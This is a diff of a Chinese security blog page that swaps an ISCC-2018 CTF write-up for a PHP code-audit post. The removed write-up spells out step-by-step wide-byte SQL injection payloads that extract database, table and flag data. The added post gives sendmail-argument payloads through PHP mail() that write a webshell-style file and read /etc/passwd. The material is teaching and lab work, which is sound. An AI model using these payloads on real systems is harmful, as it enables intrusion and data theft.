@@ -15,32 +15,22 @@
 
 
 
-<meta name="description" content="今天做了ISCC2018的CTF，里面有一道宽字节注入的题，讲一下解题思路。">
-<meta name="keywords" content="CTF-WriteUp">
+<meta name="description" content="前言 不管是源题目还是预留题目我都没有复现成功，但这其中还是学到了其它的东西">
+<meta name="keywords" content="代码审计,PHP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ISCC-2018 web题&quot;SQL注入的艺术&quot; write up">
-<meta property="og:url" content="http://yoursite.com/2018/05/01/ISCC-2018-web6/index.html">
+<meta property="og:title" content="PHP代码审计-mail函数参数的漏洞利用">
+<meta property="og:url" content="http://yoursite.com/2018/09/28/PHP-Audit-Labs-Day5/index.html">
 <meta property="og:site_name" content="Double--R blog">
-<meta property="og:description" content="今天做了ISCC2018的CTF，里面有一道宽字节注入的题，讲一下解题思路。">
+<meta property="og:description" content="前言 不管是源题目还是预留题目我都没有复现成功，但这其中还是学到了其它的东西">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/blog/18.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/1.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/2.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/3.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/4.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/5.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/6.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/7.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/8.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/9.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/10.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/11.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/12.jpg">
-<meta property="og:updated_time" content="2018-07-23T01:37:21.042Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/27.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP-Audit-Labs/Day5/1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP-Audit-Labs/Day5/2.png">
+<meta property="og:updated_time" content="2018-09-29T10:45:18.283Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ISCC-2018 web题&quot;SQL注入的艺术&quot; write up">
-<meta name="twitter:description" content="今天做了ISCC2018的CTF，里面有一道宽字节注入的题，讲一下解题思路。">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/blog/18.jpg">
+<meta name="twitter:title" content="PHP代码审计-mail函数参数的漏洞利用">
+<meta name="twitter:description" content="前言 不管是源题目还是预留题目我都没有复现成功，但这其中还是学到了其它的东西">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/27.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -72,7 +62,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>ISCC-2018 web题&#34;SQL注入的艺术&#34; write up | Double--R blog</title>
+<title>PHP代码审计-mail函数参数的漏洞利用 | Double--R blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -322,11 +312,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-ISCC-2018-web6" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-PHP-Audit-Labs-Day5" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/05/01/ISCC-2018-web6/" class="article-date">
-      <time datetime="2018-05-01T11:33:08.000Z" itemprop="datePublished">2018-05-01</time>
+      <a href="/2018/09/28/PHP-Audit-Labs-Day5/" class="article-date">
+      <time datetime="2018-09-28T09:42:21.000Z" itemprop="datePublished">2018-09-28</time>
 </a>
 
 
@@ -341,7 +331,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      ISCC-2018 web题&#34;SQL注入的艺术&#34; write up
+      PHP代码审计-mail函数参数的漏洞利用
     </h1>
   
 
@@ -350,7 +340,7 @@
 		<span class="post-meta-item-icon">
 			<i class="fa fa-keyboard-o"></i>
 			<span class="post-meta-item-text"> 字数统计: </span>
-			<span class="post-count">715字</span>
+			<span class="post-count">721字</span>
 		</span>
 	</span>
 	
@@ -372,7 +362,7 @@
 
         
     <div class="article-tag tagcloud" style="margin-top:30px;">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF-WriteUp/">CTF-WriteUp</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -382,63 +372,49 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p><strong>今天做了ISCC2018的CTF，里面有一道宽字节注入的题，讲一下解题思路。</strong></p>
+        <p><strong>前言</strong></p>
+<p>不管是源题目还是预留题目我都没有复现成功，但这其中还是学到了其它的东西</p>
 <hr>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/blog/18.jpg" alt="Alt text"></p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/27.jpg" alt=""></p>
 <a id="more"></a>
-<h4 id="第一步：看题"><a href="#第一步：看题" class="headerlink" title="第一步：看题"></a>第一步：看题</h4><ul>
-<li>进去以后有两个界面，一个首页，一个个人信息界面：</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/1.jpg" alt="Alt text"></p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/2.jpg" alt="Alt text"></p>
-<ul>
-<li>在个人信息界面看到?id=1，疑似注入点，单引号闭合一下，没有成功，单引号疑似被转义。极大可能是宽字节注入。</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/3.jpg" alt="Alt text"></p>
-<h4 id="讲一下宽字节注入"><a href="#讲一下宽字节注入" class="headerlink" title="讲一下宽字节注入"></a>讲一下宽字节注入</h4><ul>
-<li><p><a href="https://www.cnblogs.com/lcamry/articles/5625276.html" target="_blank" rel="noopener">sql宽字节注入详解</a></p>
-<p>   gbk编码中汉字占两个字节，mysql在使用gbk编码时会认为两个字符是一个汉字（前一个的ascii码值要大于128，才到汉字范围）。当单引号被转义后’就变成了\’,如果我们把单引号改成%df’，转义后就是%df\’,\的ascii码值是5c，gbk编码认为%df%5c是一个汉字，所以单引号逃出转义，我们就能闭合查询语句。注意：虽然gb2312也是宽字节中的一员，但gb2312编码的取值范围高位为0xA1~0xF7，低位为0xA~0xFE,\号不再范围中，所以无法被编码。</p>
-</li>
-</ul>
-<h4 id="尝试宽字节注入"><a href="#尝试宽字节注入" class="headerlink" title="尝试宽字节注入"></a>尝试宽字节注入</h4><ul>
-<li>构造payload：1 %df’ and 1=1 %23 和 1 %df’ and 1=2 %23看能否宽字节注入。</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/4.jpg" alt="Alt text"></p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/5.jpg" alt="Alt text"></p>
-<ul>
-<li>1=1逻辑成立，查询成功，有显示内容。1=2逻辑不成立，查询失败，无显示内容。成功将语句插入到查询语句中，宽字节注入可行。</li>
-</ul>
-<h4 id="Order-by-子句猜查询字段数"><a href="#Order-by-子句猜查询字段数" class="headerlink" title="Order by 子句猜查询字段数"></a>Order by 子句猜查询字段数</h4><ul>
-<li>构造payload：1 %df’ order by n %23. n从1开始逐渐变大，当n为8时能正常显示，n为9时无显示。说明查询语句查询了8个字段。</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/6.jpg" alt="Alt text"></p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/7.jpg" alt="Alt text"></p>
-<h4 id="判断查询结果输出的位置"><a href="#判断查询结果输出的位置" class="headerlink" title="判断查询结果输出的位置"></a>判断查询结果输出的位置</h4><ul>
-<li>构造payload：-1 %df’ union select 1,2,3,4,5,6,7,8 %23. 2、7、4位的信息输出。</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/8.jpg" alt="ALt text"></p>
-<h4 id="开始获得数据库信息"><a href="#开始获得数据库信息" class="headerlink" title="开始获得数据库信息"></a>开始获得数据库信息</h4><ul>
-<li>构造payload：-1 %df’ union select 1,database(),3,version(),5,6,7,8 %23 查询当前使用数据库名和版本信息。</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/9.jpg" alt="ALt text"></p>
-<ul>
-<li>数据库名baji，构造payload：-1 %df’ union select 1,group_concat(table_name),3,4,5,6,7,8 from information_schema.tables where table_schema=0x62616A69 %23，查表名（0x62616A69为数据库名的ascii码值)</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/10.jpg" alt="Alt text"></p>
-<ul>
-<li>只有一个admins表，构造payload：-1 %df’ union select 1,group_concat(column_name),3,4,5,6,7,8 from information_schema.columns where table_schema=0x62616A69 %23，查字段名。注：按理来说如果不止一张表要确定具体查询的表，完整的是 where table_schema=baji and table_name=admins，但是它只有一个表，我懒得编码表名了。</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/11.jpg" alt="Alt text"></p>
-<ul>
-<li>有个flag的字段名，查一下这个字段下的信息，构造payload：-1 %df’ union select 1,group_concat(flag),3,4,5,6,7,8 from baji.admins %23</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/12.jpg" alt="Alt text"></p>
-<ul>
-<li>出flag,提交成功，题目解出。</li>
-</ul>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><strong>题目与一些盲注比起来还是比较简单的，没有什么过滤，也不用写注入脚本，手注就行了。做下来没有什么地方卡住的。还是要继续努力，下次做出一些难题来。</strong></p>
 <hr>
-<div align="center"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=487190408&auto=1&height=66"></iframe></div>
+<h2 id="Mail函数"><a href="#Mail函数" class="headerlink" title="Mail函数"></a>Mail函数</h2><p>mail函数是PHP自带的内联函数，用来发送邮件。它是使用Linux下的sendmail实现邮件的发送的，所以在使用之前我们需要先安装一些包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install sendmail</span><br><span class="line">sudo apt-get install sendmail-cf</span><br><span class="line">sudo apt-get install squirrelmail //提供webmail</span><br><span class="line">sudo apt-get install mailutils //Ubuntu下使用最常用的mail功能</span><br></pre></td></tr></table></figure>
+<p>安装完包我们来看一下mail函数的定义</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bool mail ( string $to , string $subject , string $message [, mixed $additional_headers [, string $additional_parameters ]] )</span><br><span class="line"><span class="comment">//(PHP 4, PHP 5, PHP 7) mail — Send mail</span></span><br></pre></td></tr></table></figure>
+<p>具体分析：</p>
+<ul>
+<li>to：指定邮件接收者，即接收人</li>
+<li>subject：邮件的标题</li>
+<li>message：邮件的正文内容</li>
+<li>additional_headers：制定邮件发送时其它的额外头部，如发送者From，抄送CC，隐藏抄送BCC</li>
+<li>additional_parameters：指定传递给发送程序sendmail的额外参数</li>
+</ul>
+<p>在PHP中，mail的函数在底层中已经写好了，默认调用Linux的sendmail程序发送邮件。而在额外参数中，sendmail主要支持的选项有以下三种：</p>
+<ul>
+<li>-X logfile：这个参数可以指定一个目录加记录发送邮件是的详细日志情况，也就意味着可以写文件</li>
+<li>-C file：临时加载一个配置文件，就是可以读文件</li>
+<li>-O option=value：是临时设置一个邮件存储的临时目录的配置</li>
+</ul>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>当mail函数的第五个参数可控时，我们就可以利用这个参数达到一些目的。</p>
+<p><strong>源代码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mailer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'to'</span>])) &#123;</span><br><span class="line">            $data[<span class="string">'to'</span>] = <span class="string">'none@ripstech.com'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'from'</span>])) &#123;</span><br><span class="line">            $data[<span class="string">'from'</span>] = <span class="string">'none@ripstech.com'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'subject'</span>])) &#123;</span><br><span class="line">            $data[<span class="string">'subject'</span>] = <span class="string">'No Subject'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'message'</span>])) &#123;</span><br><span class="line">            $data[<span class="string">'message'</span>] = <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mail($data[<span class="string">'to'</span>], $data[<span class="string">'subject'</span>], $data[<span class="string">'message'</span>],</span><br><span class="line">             <span class="string">''</span>, $data[<span class="string">'from'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mailer = <span class="keyword">new</span> Mailer();</span><br><span class="line">$mailer-&gt;send($_POST);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>姿势一：任意文件写入</strong></p>
+<p>由于mail函数的message和additional_parameters我们都可控，所以我们可以通过写日志的方式将任意内容写到任意文件中，payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">to=test@example.com&amp;subject=hello&amp;message=&lt;?php phpinfo();?&gt;&amp;from=-oQ/tmp -X./rec.php</span><br></pre></td></tr></table></figure>
+<p>这里的意思就收说我们将发送邮件的信息临时保存在tmp下面，最后将日志保存到当前路径下的rec.php中，这样我们就将phpinfo写入到了文件中。</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP-Audit-Labs/Day5/1.png" alt=""></p>
+<p><strong>姿势二：任意文件读取</strong></p>
+<p>既然我们能写文件，我们就能通过读取配置文件的方式读取任意文件，然后将文件内容通过写日志文件的方式写入任意我们可访问的文件，payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">to=test@example.com&amp;subject=hello&amp;message=&lt;?php phpinfo();?&gt;&amp;from=-C/etc/passwd -X./rec.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP-Audit-Labs/Day5/2.png" alt=""></p>
+<hr>
+<p><a href="http://blog.nsfocus.net/hack-php-mail-additional_parameters-3/" target="_blank" rel="noopener">PHP mail函数参数的漏洞利用姿势</a></p>
+<p><a href="https://xz.aliyun.com/t/2501" target="_blank" rel="noopener">[红日安全]代码审计Day5 - escapeshellarg与escapeshellcmd使用不当</a></p>
+<hr>
+<div align="center"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=33418570&auto=1&height=66"></iframe></div>
+
+
       
     </div>
     
@@ -446,13 +422,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/05/01/ISCC-2018-web6/">ISCC-2018 web题&#34;SQL注入的艺术&#34; write up</a></p>
+        <p><span>本文标题:</span><a href="/2018/09/28/PHP-Audit-Labs-Day5/">PHP代码审计-mail函数参数的漏洞利用</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Double--R</a></p>
-        <p><span>发布时间:</span>2018-05-01, 19:33:08</p>
-        <p><span>最后更新:</span>2018-07-23, 09:37:21</p>
+        <p><span>发布时间:</span>2018-09-28, 17:42:21</p>
+        <p><span>最后更新:</span>2018-09-29, 18:45:18</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/05/01/ISCC-2018-web6/" title="ISCC-2018 web题&#34;SQL注入的艺术&#34; write up">http://yoursite.com/2018/05/01/ISCC-2018-web6/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/05/01/ISCC-2018-web6/　　作者: Double--R" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/09/28/PHP-Audit-Labs-Day5/" title="PHP代码审计-mail函数参数的漏洞利用">http://yoursite.com/2018/09/28/PHP-Audit-Labs-Day5/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/09/28/PHP-Audit-Labs-Day5/　　作者: Double--R" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -464,16 +440,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/05/12/Easy-Unserialize-Writeup/">
-                    php反序列化组会例题和makerctf easy_unserialize的wp
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/04/27/BugKu-Login3/">
-                    BugKuCTF-Login3的Write Up
+                <a href="/2018/09/26/PHP-Audit-Labs-Day4/">
+                    PHP代码审计-strpos使用不当引发漏洞
                 </a>
             </div>
         
@@ -485,7 +455,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#第一步：看题"><span class="toc-number">1.</span> <span class="toc-text">第一步：看题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#讲一下宽字节注入"><span class="toc-number">2.</span> <span class="toc-text">讲一下宽字节注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#尝试宽字节注入"><span class="toc-number">3.</span> <span class="toc-text">尝试宽字节注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Order-by-子句猜查询字段数"><span class="toc-number">4.</span> <span class="toc-text">Order by 子句猜查询字段数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#判断查询结果输出的位置"><span class="toc-number">5.</span> <span class="toc-text">判断查询结果输出的位置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#开始获得数据库信息"><span class="toc-number">6.</span> <span class="toc-text">开始获得数据库信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#总结"><span class="toc-number">7.</span> <span class="toc-text">总结</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Mail函数"><span class="toc-number">1.</span> <span class="toc-text">Mail函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a></li></ol>
         
     </div>
     <style>
@@ -521,7 +491,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"ISCC-2018 web题"SQL注入的艺术" write up　| Double--R blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"PHP代码审计-mail函数参数的漏洞利用　| Double--R blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -541,15 +511,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/05/12/Easy-Unserialize-Writeup/" title="上一篇: php反序列化组会例题和makerctf easy_unserialize的wp">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/04/27/BugKu-Login3/" title="下一篇: BugKuCTF-Login3的Write Up">
+            <a href="/2018/09/26/PHP-Audit-Labs-Day4/" title="下一篇: PHP代码审计-strpos使用不当引发漏洞">
                 <i class="fa fa-angle-right"></i>
             </a>
         
